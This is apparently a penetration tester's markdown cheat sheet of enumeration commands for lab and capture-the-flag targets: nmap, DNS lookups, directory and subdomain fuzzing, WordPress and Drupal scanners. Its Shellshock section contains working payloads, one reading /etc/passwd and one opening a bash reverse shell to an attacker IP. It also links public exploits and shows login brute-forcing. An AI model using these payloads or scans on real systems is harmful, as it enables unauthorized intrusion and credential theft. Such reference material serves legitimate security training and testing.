# Enumeration

<details>

<summary>Reverse Lookup IP addresses to hostnames</summary>

### Using nslookup

```bash
nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
;; communications error to 10.10.10.13#53: timed out
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

### Obtain IPs of machines that are up:

* save as `ips.txt`

```bash
nmap -sn --min-rate 5000 10.11.1.0/24 | grep "Nmap scan report for" | cut -d " " -f 5 > ips.txt
```

### Find possible DNS servers

```bash
nmap -p 53 --min-rate 5000 -iL ips.txt -oG dns_scan_results.txt
```

```bash
cat dns_scan_results.txt | grep "Ports: 53/open/" | cut -d " " -f 2 > dns_servers.txt
```

### Using DNSrecon to reverse lookup using different DNS servers:

```bash
for server in $(cat dns_servers.txt); do echo Using DNS server $server;dnsrecon -r 10.11.1.0/24 -n $server; done
```

### Reverse DNS lookup for one IP:

#### DNSRecon

```bash
dnsrecon -r 10.11.1.0/24 -n 10.11.1.220
```

#### Host command

```bash
host 10.11.1.116 10.11.1.220 
```

* Query dns server at 10.11.1.220 about the hostname of 10.11.1.116

</details>

<details>

<summary>Sitemap files</summary>

* /robots.txt

- /.htaccess

* /.htpasswd

- /sitemap.xml

</details>

<details>

<summary>Try /cgi-bin/ folder (Shellshock)</summary>

* If Status Code 200 --> possibly [shellshock](https://github.com/b4keSn4ke/CVE-2014-6271)
* If Status Code 403 --> try to enumerate `.sh`, `.cgi` files under `/cgi-bin/` directory

```bash
dirsearch -u http://10.11.1.71/cgi-bin -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt
```

* Commands for Shellshock

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh
```

* Burp Shellshock POST Request

```bash
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.2/8081 0>&1
Content-Length: 28

page=%2F&user=root&pass=root
```

* Nmap scan to search for shellshock

```bash
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=ls <target>
```

broken by default, fix here: [https://www.youtube.com/watch?v=IBlTdguhgfY\&t=670s](https://www.youtube.com/watch?v=IBlTdguhgfY\&t=670s)

</details>

<details>

<summary>Dirsearch</summary>

<pre class="language-shell"><code class="lang-shell"><strong>dirsearch -u &#x3C;ip> -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</strong></code></pre>

```shell
dirsearch -u 172.16.64.140/project --auth-type=basic --auth=YWRtaW46YWRtaW4= -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
dirsearch -u http://192.168.206.156:8000/ipphone_files --cookie="PHPSESSID=cjetu00a7pouinp0oj9v01r6r0" -X -i 200,301 -r -f -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Through a socks proxy (chisel port forwarding + proxychains)

```bash
dirsearch -u http://127.0.0.1:8000 -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080
```

</details>

<details>

<summary>Subdomain Enumeration</summary>

```bash
ffuf -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw <no. of words for default page>

gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain | grep -v 302
```

Can try wordlist`/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`

* Add any subdomain you've found into `/etc/hosts`

```
10.10.57.54 dev.cmess.htm
```

</details>

<details>

<summary>Wpscan</summary>

```bash
wpscan --url somewebsite.com --enumerate u,ap,at,cb,dbe
```

* add in `--disable-tls-checks` for HTTPS sites

</details>

<details>

<summary>Droopescan (Drupal)</summary>

```bash
droopescan scan drupal -u http://10.10.10.9/ -t 32
```

Drupal 7 <= 7.57

* [https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py)

</details>

<details>

<summary>Gobuster</summary>

```shell
gobuster dir -u <target site> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200 -q
```

```shell
gobuster dir -x php,txt -u <ip> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 200 -q
```

```
gobuster -s 200,204,301,302,307,403 -u 172.21.0.0 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
```

```bash
gobuster dir -k -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -t 20
```

### Enumerate API (often followed by version number, v1, v2)

```bash
#api --> often followed by a version number
#	/api_name/v1
#	/api_name/v2
#pattern file:
#	{GOBUSTER}/v1
#	{GOBUSTER}/v2
gobuster dir -u http://192.168.50.16:5002 -w 
```

</details>

<details>

<summary>Testing file extensions for IIS servers</summary>

```
asp
aspx
config
php
```

</details>

<details>

<summary>Wfuzzf</summary>

```bash
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
```

```
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```

#### Post req:

```bash
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php (Post Requests)
```

#### Fuzzing cookies:

```bash
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ
```

</details>

<details>

<summary>Perform Zone Transfer</summary>

* Scan a domain, specifying the nameserver and performing a zone transfer

```bash
dnsrecon --domain example.com --name_server nameserver.example.com --type axfr
```

</details>

<details>

<summary>Dig</summary>

### Zone Transfer

```bash
dig @192.168.194.165 AXFR heist.offsec
```

```bash
dig www.example.com + short
```

* For IPv4

```bash
dig -4 www.example.com 
```

```bash
dig www.example.com MX
```

```bash
dig www.example.com NS
```

```bash
dig www.example.com> SOA
```

</details>

<details>

<summary>DNSEnum</summary>

```bash
dnsenum 192.168.194.165
```

</details>

<details>

<summary>SSH Username Enum</summary>

* Linux with OpenSSH < 7.7

[https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py](https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py)

```
python ssh-username-enum.py <IP> -w <wordlist>
```

* Wordlist: [https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt)

</details>

<details>

<summary>Fuzzing Endpoints (Searching for LFI)</summary>

Eg: [https://streamio.htb/admin/?user=](https://streamio.htb/admin/?user=), [https://streamio.htb/admin/?message=](https://streamio.htb/admin/?message=)

```bash
# Fuzzing other endpoints
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=mjsjfrb7o82c82voh1l7l964ek --fs <error page file size>
```



</details>
